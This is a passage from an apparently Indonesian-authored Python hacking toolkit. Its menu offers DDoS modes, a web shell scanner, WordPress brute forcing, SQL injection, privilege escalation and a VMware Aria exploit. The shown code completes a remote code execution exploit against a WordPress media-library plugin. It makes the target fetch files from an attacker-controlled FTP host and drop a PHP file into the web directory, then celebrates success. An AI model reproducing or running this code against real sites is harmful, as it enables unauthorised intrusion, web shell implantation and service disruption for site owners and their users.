        remote_virus = remotehttp +"/"+png_polyglot_name
        try:
            r = requests.get(remote_virus)
        except Exception as e:
            print(warna("\t[x] The Remote HTTP Server Hosting PNG Virus seems to be down, error:" +str(e), Fore.RED))
            exit()
        
        if r.status_code == 404:
            print(warna("\t[x] The remote PNG/PHP file is not reachable (404)", Fore.RED))
            exit()
        else:
            print(warna("\t[-] The remote Exploit PNG/PHP file is reachable", Fore.LIGHTGREEN_EX))



        #Laucnhing exploitation 
        print(warna("[!] All arguments have been checked correctly, lauching exploitation", Fore.LIGHTYELLOW_EX))
        print(warna("[-] Lauching "+str(concurrency)+" Threads on long SVG", Fore.LIGHTCYAN_EX))
        
        exploit_url = target_mla + "?mla_stream_file="+ftp_target
        exploit_ploly_list = [exploit_url] * concurrency
        rs = (grequests.get(u,timeout=0.5) for u in exploit_ploly_list)
        grequests.map(rs) 

        print(warna("[-] Waiting 5 second for the file to be created", Fore.LIGHTCYAN_EX))
        time.sleep(5)

        print(warna("[-] Starting Bruteforcing with VID exploiters", Fore.LIGHTCYAN_EX))
        exploit_url_list = []
        for i in bruteforce_list:
            exploit_url = target_mla + "?mla_stream_file="+remoteftp+"/"+svg_exploiter_names.replace("FUZZ",i)
            exploit_url_list.append(exploit_url)

        rs = (grequests.get(u,timeout=0.5) for u in exploit_url_list)
        grequests.map(rs) 

        time.sleep(5)
        print(warna("[-] Checking the drop of "+exploitname, Fore.LIGHTCYAN_EX))
        target_virus = target+"/"+exploitname

        i = 0   
        #timeout to 80 second
        while i <= 8:
            try:
                r = requests.get(target_virus)
            except Exception as e:
                print(warna("\t[!] Error while reaching the target URL, hope you did not crash it: " +str(e), Fore.RED))
                exit()
            if (r.status_code == 200):
                print(warna("\t[-] Exploit worked!, the PHP file is in the web directory, Enjoy 🔥", Fore.LIGHTGREEN_EX))
                exit()
            else:
                print(warna("\t[!] Not yet, try "+str(i+1)+" on 9 ... checking again in 10 seconds", Fore.LIGHTYELLOW_EX))
                time.sleep(10)
                i =+ i+1
                continue

        print(warna("\t[!] Exploit has not worked, try by increase concurrency value or use another method", Fore.RED))
        exit()
    else:
        print(warna("\t[!] Missing arguments!", Fore.RED))
        exit()   
#######################################################################################################################



# main


def banner():
    space = " " * 10
    banner = (f"""
{space}{space}{space}{space}{space}{space}{space}{Fore.LIGHTGREEN_EX}╔╗ ┬  ┌─┐┌─┐┬┌─  ╔╦╗┌─┐┌─┐┬  ┌─┐
{space}{space}{space}{space}{space}{space}{space}{Fore.LIGHTGREEN_EX}╠╩╗│  ├─┤│  ├┴┐   ║ │ ││ ││  └─┐
{space}{space}{space}{space}{space}{space}{space}{Fore.LIGHTGREEN_EX}╚═╝┴─┘┴ ┴└─┘┴ ┴   ╩ └─┘└─┘┴─┘└─┘\n 
{space}{Fore.CYAN}╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
{space}{Fore.CYAN}║ # Tools Created By Black Space Indonesian Hacking                                                                                       ║
{space}{Fore.CYAN}╠═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣
{space}{Fore.CYAN}║ # simple - DDOS simple attack                                                                                                           ║
{space}{Fore.CYAN}║ # hulk - DDOS using tools hulk                                                                                                          ║
{space}{Fore.CYAN}║ # shell - SHELL SCANNER 1k List                                                                                                         ║
{space}{Fore.CYAN}║ # shell2 - SHELL SCANNER 1k List                                                                                                         ║
{space}{Fore.CYAN}║ # wpbf - Wordpress Brute Force                                                                                                          ║
{space}{Fore.CYAN}║ # vmware - Vmware Aria Operations for NetWork                                                                                           ║
{space}{Fore.CYAN}║ # wg - Wordlist Generator                                                                                                               ║
{space}{Fore.CYAN}║ # Find - Find Locations                                                                                                                 ║
{space}{Fore.CYAN}║ # exploit1 - Unauthenticated SQL Injection - Paid Memberships Pro < 2.9.8 (WordPress Plugin)                                            ║
{space}{Fore.CYAN}║ # exploit2 - Essential Addons for Elementor 5.4.0-5.7.1 - Unauthenticated Privilege Escalation                                          ║
{space}{Fore.CYAN}║ # exploit3 - RCE Exploit for Wordpress Plugin Media-Library Plugin < 3.10 (before Useage python3 -m http.server -p 8081)                ║
{space}{Fore.CYAN}╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝\n
""")
    print(banner)
def handle_ctrl_c(signal, frame):
    input(warna("\n[+] Press enter if you want to exit..", Fore.RED))
    print(warna("[-] Black system has stoped..", Fore.RED))
    signal.signal(signal.SIGINT, signal.SIG_DFL)
    os._exit(0)
# Fungsi untuk menampilkan pesan dan meminta input yes/no
def tanya_lanjut():
    while True:
        pilihan = input(warna("[?] Apakah Anda ingin melanjutkan? (yes/no): ", Fore.CYAN)).strip().lower()
        if pilihan == "yes" or pilihan == "y":
            os.system("cls")
            return True
        elif pilihan == "no" or pilihan == "n":
            return False
        else:
            print(warna("[ Stupid ] Pilihan tidak valid. Harap masukkan 'yes' atau 'no'.", Fore.RED))

# Main program
if __name__ == "__main__":
    clear_text()
    # login() 
    init(autoreset=True)  # Inisialisasi colorama
    signal.signal(signal.SIGINT, handle_ctrl_c)
    while True:
        banner()
        command = input(warna("┌──(ROOT@ROOT)-[black]\n└─# ", Fore.LIGHTGREEN_EX))

        if command == "vmware" or command == "Vmware":
            vmware()
            print(warna("[=] Anda telah menjalankan perintah VMware.", Fore.LIGHTGREEN_EX))
        elif command == "wpbf" or command == "WpBf":
            wpbf()
            print(warna("[=] Anda telah menjalankan perintah WPBF.", Fore.LIGHTGREEN_EX))
        elif command == "shell" or command == "Shell":
            shell() 
            print(warna("[=] Anda telah menjalankan perintah shell.", Fore.LIGHTGREEN_EX))
        elif command == "simple" or command == "Simple":
            dos() 
            print(warna("[=] Anda telah menjalankan perintah DDOS Simple.", Fore.LIGHTGREEN_EX))
        elif command == "9995" or command == "CVE1":
            cve9995() 
            print(warna("[=] Anda telah menjalankan perintah CVE.", Fore.LIGHTGREEN_EX))
        elif command == "exploit1" or command == "Exploit1":
            exploit1() 
            print(warna("[=] Anda telah menjalankan perintah Exploit1.", Fore.LIGHTGREEN_EX))
        elif command == "exploit2" or command == "Exploit2":
            exploit2() 
            print(warna("[=] Anda telah menjalankan perintah Exploit2.", Fore.LIGHTGREEN_EX))
        elif command == "exploit3" or command == "Exploit3":
            exploit3() 
            print(warna("[=] Anda telah menjalankan perintah Exploit3.", Fore.LIGHTGREEN_EX))
        elif command == "shell2" or command == "Shell2":
            shell2() 
            print(warna("[=] Anda telah menjalankan perintah Shell2.", Fore.LIGHTGREEN_EX))
        else:
            banner()
            command = input(warna("┌──(clay88㉿DESKTOP-2IQDMMA)-[#]\n└─# ", Fore.LIGHTGREEN_EX))
            

        if not tanya_lanjut():
            break
